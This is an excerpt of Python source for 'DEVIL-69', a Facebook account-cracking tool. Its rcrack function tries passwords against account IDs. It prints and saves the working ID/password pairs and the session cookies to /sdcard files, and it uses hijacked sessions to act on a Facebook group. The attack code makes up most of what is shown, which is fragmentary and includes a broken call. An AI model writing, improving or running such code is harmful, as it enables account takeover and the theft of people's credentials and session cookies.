...
def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] JOIN OUR FACEBOOK GROUP')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://facebook.com/groups/299855573500710/?ref=share')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/kn.je.id.er.link.copy.kortaco?mibextid=ZbWKwL')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://facebook.com/groups/299855573500710/', {
...
\033[1;37m================= \33[32;45mDEVIL-69\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSIAM\33[0;m\033[1;32m && \033[1;33mRAJ\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m OLIDUR-RAHMAN-SIAM
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mDEVIL-69
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mBANGLA FUCKING
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m1.0.1
\033[1;37m================= \33[32;45mSIAM-69\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO DEVIL-69TOOL\33[0;m
 
\033[1;37m================== \33[32;45mENJOY\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
...
def i():
    ...
    jalan("\033[1;37m\t  USE ANY COUNTRY CODE  ")
...
def rcrack(uid,pwx,tl):
    ...
    try:
       ...
       # 'cookie': 'datr=duz0Y2GBQKV_pLAFTzCILNki; sb=d-z0Y2mmkGeRLhGoutSyxO7z; m_pixel_ratio=1.875; wd=384x727; fr=0MsXMHWyrWirhnSxp..Bj9Ox2.63.AAA.0.0.Bj9Oyl.AWWzmpMMN-w',
          ...
          'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SIAM-69-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ROBIN404-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(SIAM-69-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SIAM-69-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[SIAM-69] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
